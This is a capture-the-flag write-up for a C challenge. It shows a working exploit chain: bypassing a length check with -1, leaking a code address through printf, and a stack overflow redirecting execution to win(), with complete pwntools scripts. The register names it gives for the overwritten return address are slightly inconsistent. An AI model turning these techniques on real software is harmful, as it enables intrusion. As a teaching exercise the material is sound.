# The challenge
You can run the following c code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    printf("You win! here is your flag");
    system("/bin/cat flag.txt");
}

void getData(char* buf, unsigned int len) {
    printf("enter buffer\n");
    read(0, buf, len);
}

int main() {
    int length;
    char buf[64];

    while (1) {
        printf("enter length\n");

        scanf("%d", &length);
        if (length > 64) {
            printf("message too long");
            return 0;
        }

        getData(buf, length);
        printf("%s\n", buf);
    }
}
```

## Solution
The solution has 3 parts:
- figuring out how to send (almost) unlimited data instead of only 63 bytes
- finding the address of the win function
- forcing the program to call win()

### Stage 1 - sending all the data we want
This is the easiest step. if we send -1 as length, then it will pass the test, and register as smaller than 64.
But, the binary representation of -1 as int, is 0xffffffff, so when we convert it to unsigned int during the call to getData, it will be 0xffffffff, which equals 4294967295 - way more than enough to send the data we need.

### Stage 2 - the winning address
First, we know that the relative address of each run, of the main function and the win function are the same. we can figure those out by using objdump.
```bash
objdump -d ./challenge | grep -E "win|main"
```
From this, we can see that the address of win from the start of the program is 0x11c9, and the address of main is 1230.

Before the main function starts running there are some setup functions, like _start. In _start, it calls  __libc_start_main, with the address of main as the argument of the main address - which is stored in rdi. After __libc_start_main sets up the stack, it pushes rdi to the stack, and it never pops it. This means, that during the execution of main, it's address is stored somewhere in the stack.
the way printf works, is by reading characters from the stack, until it reaches 0x00, starting from the given address (buf). In addition, we know that the first 3 bytes of the main address will be 0x000055 or 0x000056, so if we do manage to get the address of main from the stack, printf will stop right after.

What we can do is send all sorts of different lengths of data to the process, and than, when the next 6 bytes that the program will return, will start with 0x55 or 0x56 (after changing endianness), we will know that we hit some function(that is the main).

```python
from pwn import *

p = process("./challenge")

for i in range(1, 150):
    p.sendlineafter(b"length\n", b"-1")
    p.sendafter(b"buffer\n", b"A" * i)

    p.recvuntil(b"A" * i)

    try:
        rawLeak = p.recv(6)
        leakedAddr = int.from_bytes(rawLeak, byteorder="little")
        
        if hex(leakedAddr).startswith("0x55") or hex(leakedAddr).startswith("0x56"):
            mainAddress = leakedAddr
            print("main address: ", hex(mainAddress))
            break

    except:
        pass

p.close()
```

Now, finally, in order to get the address of win(), all we need to do is subtract the offset of main() from it's address, and add to that the offset of win().

### Stage 3 - forcing the win
In order to get to win(), we can overflow the buffer and change the stack where the return address is stored.
In order to figure out where that is, we can use gdb.
we will feed the buffer a long string, and then give a number greater than 64 as length in order to trigger the return 0. Then, we can see what is the value of rsi.
if we feed this to buf:
```'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma```, we will see that rdi will store: ```waaa```. There are 88 characters before ```waaa```, so this means, we need to send 88 characters and then the address that we want.

One thing worth mentioning, is that in the begginning of the win function, it pushes things into the stack. this is problematic, because the stack pointers has to be a multiple of 16, which it won't. To solve this, we can skip those to instructions, and go 5 bytes ahead.

### The full solution
```python
from pwn import *

p = process('./challenge')

for i in range(1, 150):
    p.sendlineafter(b"length\n", b"-1")
    p.sendafter(b"buffer\n", b"A" * i)

    p.recvuntil(b"A" * i)

    try:
        rawLeak = p.recv(6)
        leakedAddr = int.from_bytes(rawLeak, byteorder="little")
        
        if hex(leakedAddr).startswith("0x55") or hex(leakedAddr).startswith("0x56"):
            mainAddress = leakedAddr
            print("main address: ", hex(mainAddress))
            break

    except:
        pass

mainOffset, winOffset = 0x1230, 0x11c9
winAddress = mainAddress - mainOffset + winOffset + 5
print("win address: ", hex(winAddress))

p.sendlineafter(b"length\n", b"-1")

p.sendafter(b"buffer\n", b"A" * 88 + winAddress.to_bytes(8, byteorder='little'))

p.sendlineafter(b"length\n", b"100")

p.interactive()

```